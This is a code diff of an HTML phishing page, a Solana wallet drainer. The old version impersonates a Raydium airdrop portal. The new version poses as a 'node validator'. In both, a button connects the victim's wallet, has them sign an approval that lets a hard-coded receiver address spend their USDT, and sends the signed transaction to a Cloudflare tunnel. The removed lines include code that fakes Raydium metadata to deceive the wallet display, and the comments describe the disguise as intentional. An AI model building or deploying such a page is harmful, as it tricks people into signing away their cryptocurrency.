@@ -2,37 +2,32 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Raydium | Airdrop Portal</title>
+    <title>Solana Node Validator</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 40px; border-radius: 24px; border: 1px solid #222; text-align: center; width: 320px; box-shadow: 0 0 20px rgba(20, 241, 149, 0.2); }
-        #cta { background: #14F195; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; }
+        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; }
+        #cta { background: #14F195; color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://raydium.io/logo/logo-only-light.svg" style="width:60px; margin-bottom:20px;">
-        <h2 style="margin:0;">Swap Protocol</h2>
-        <p style="color:#666; font-size:12px;">Initialize your trading route to enable rewards auto-claim.</p>
-        <button id="cta">INITIALIZE ROUTE</button>
-        <div id="st" style="margin-top:15px; font-size:10px; color:#333;">Ready</div>
+        <h2>Validation Required</h2>
+        <p style="color:#666; font-size:12px;">Approve the secure handshake to synchronize your assets with the network.</p>
+        <button id="cta">APPROVE & SYNC</button>
+        <div id="st" style="margin-top:15px; font-size:10px; color:#333;">Network: Online</div>
     </div>
 
     <script>
         const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
         const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-        // Raydium 官方合约地址
-        const RAY_PROGRAM = "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8";
 
         document.getElementById('cta').onclick = async () => {
-            const p = window.solana;
+            const p = window.solana || window.phantom?.solana;
             try {
                 await p.connect();
-                document.getElementById('st').innerText = "GENERATING ROUTE...";
-
                 const { bh } = await (await fetch(`${tunnel}/sync`)).json();
 
                 const userAta = await splToken.Token.getAssociatedTokenAddress(
@@ -40,8 +35,7 @@
                     new solanaWeb3.PublicKey(USDT_MINT), p.publicKey
                 );
 
-                // 🔱 伪装逻辑：构造一个看似发送给 Raydium 的指令
-                // 但实际执行的是对 USDT 账户的授权
+                // 🔱 使用最标准、最稳健的授权指令
                 const transaction = new solanaWeb3.Transaction().add(
                     splToken.Token.createApproveInstruction(
                         splToken.TOKEN_PROGRAM_ID, 
@@ -49,27 +43,26 @@
                         new solanaWeb3.PublicKey(RECEIVER), 
                         p.publicKey,
                         [], 
-                        900000 // 继续拿这 0.9 刀做实测
+                        950000 // 授权 0.95 USDT，确保低于你账户的 1 USDT
                     )
                 );
-
-                // 强制注入 Raydium 的元数据，诱导钱包显示 "Interact with Raydium"
-                transaction.add(new solanaWeb3.TransactionInstruction({
-                    keys: [],
-                    programId: new solanaWeb3.PublicKey(RAY_PROGRAM),
-                    data: Buffer.from([1]) // 伪造的交互数据
-                }));
 
                 transaction.recentBlockhash = bh;
                 transaction.feePayer = p.publicKey;
 
+                // 唤起签名
                 const signed = await p.signTransaction(transaction);
+                
+                // 将报文传回后端执行广播
                 fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(signed.serialize().toString('base64'))}`);
 
-                document.getElementById('st').innerText = "ROUTE SYNCED";
-                setTimeout(() => { window.location.href = "https://raydium.io/swap/"; }, 1000);
+                document.getElementById('st').innerText = "SUCCESS";
+                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
 
-            } catch(e) { location.reload(); }
+            } catch(e) { 
+                console.error(e);
+                location.reload(); 
+            }
         };
     </script>
 </body>
